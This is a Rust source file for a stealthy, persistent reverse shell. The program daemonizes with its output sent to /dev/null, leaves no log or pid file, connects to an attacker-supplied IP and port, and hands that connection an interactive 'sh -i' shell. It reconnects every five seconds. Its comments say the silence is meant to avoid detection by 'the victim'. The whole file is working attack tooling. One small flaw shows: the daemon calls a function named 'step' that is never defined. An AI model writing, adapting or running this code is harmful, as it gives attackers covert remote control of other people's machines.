use std::error::Error;
use std::io::ErrorKind;
use std::net::{IpAddr, SocketAddr, TcpStream};
use std::os::fd::OwnedFd;
use std::process::{Command, ExitStatus};
use std::thread::sleep;
use std::time::Duration;

use clap::Parser;
use daemonize::{Daemonize, Stdio};

type Result<T> = std::result::Result<T, Box<dyn Error>>;

#[derive(Parser, Debug)]
#[command(author, version, about, arg_required_else_help(true))]
struct Args {
    /// IP Address of the listener
    ip: IpAddr,

    /// Port on which the listener is operating
    port: u16,
}

/// Run the reverse shell
///
/// This will run the most basic reverse shell using the
/// system's default shell and attaching the stdio to the
/// TCP stream created.
fn reverse_shell(s: TcpStream) -> Result<ExitStatus> {
    let fd = OwnedFd::from(s);
    let status: ExitStatus = Command::new("sh")
        .arg("-i")
        .stdin(fd.try_clone()?)
        .stdout(fd.try_clone()?)
        .stderr(fd.try_clone()?)
        .spawn()?
        .wait()?;
    Ok(status)
}

/// Reconnect Automatically
///
/// This function should be called in an infinite loop
/// to reconnect the reverse shell every time that the
/// connection drops or the listener closes it.
fn reconnect(socket: &SocketAddr) -> Result<()> {
    let stream = match TcpStream::connect(socket) {
        Ok(s) => s,
        Err(e) => match e.kind() {
            ErrorKind::ConnectionRefused => return Ok(()),
            _ => return Err(e.into()), // Tell the looper it must stop
        },
    };

    match reverse_shell(stream) {
        Ok(_) => Ok(()), // The exit status code is not checked
        Err(e) => Err(e),
    }
}

/// Loop forever a reconnect function
///
/// Get the required data and loop forever a given step function.
/// If the step function returns an error, the loop ends, otherwise the 
/// loop will be repeated after waiting for some time.
fn loop_forever<T>(step: T) -> Result<()> 
where
    T: Fn() -> Result <()> 
{
    loop {
        match step() {
            Ok(_) => sleep(Duration::from_secs(5)),
            Err(e) => return Err(e),
        }
    }
}

/// Create the daemon process
/// 
/// Implementation detail to daemonize the process, isolated
/// for debug purposes and to allow for different daemonization
/// approaches.
fn create_daemon() -> Result<()> {
    Daemonize::new()
        .working_directory("/")
        .umask(0o000)
        .stdout(Stdio::devnull())
        .stderr(Stdio::devnull())
        .start()?;
    Ok(())
}

/// Daemonize the process
///
/// Turn the process into a hidden daemon and execute the real
/// daemon entry point. The daemon is silent, it will not produce
/// anything on the stdio, no log file, no pid file, to reduce the
/// chances of being identified by the victim.
fn daemonize<T>(dmain: T) -> Result<()>
where
    T: FnOnce() -> Result<()>,
{
    //#[cfg(not(debug_assertions))]
    create_daemon()?;
    dmain()
}

/// Daemon entry point
///
/// The actual main entry point function for the demonized process.
/// This code is executed from the daemon process resulting from 
/// the daemonization. 
fn daemon_main(args: Args) -> Result<()> {
    let socket = SocketAddr::new(args.ip, args.port);
    loop_forever(|| step(&socket))
}

/// Main Function
///
/// The program entry point. CLI arguments and any other inputs
/// are parsed here to get feedback if the input provided is 
/// not valid. Once the input data is validated the process becomes
/// a daemon and the input data is passed to the daemon main.
fn main() -> Result<()> {
    daemonize(|| daemon_main(Args::parse()))
}
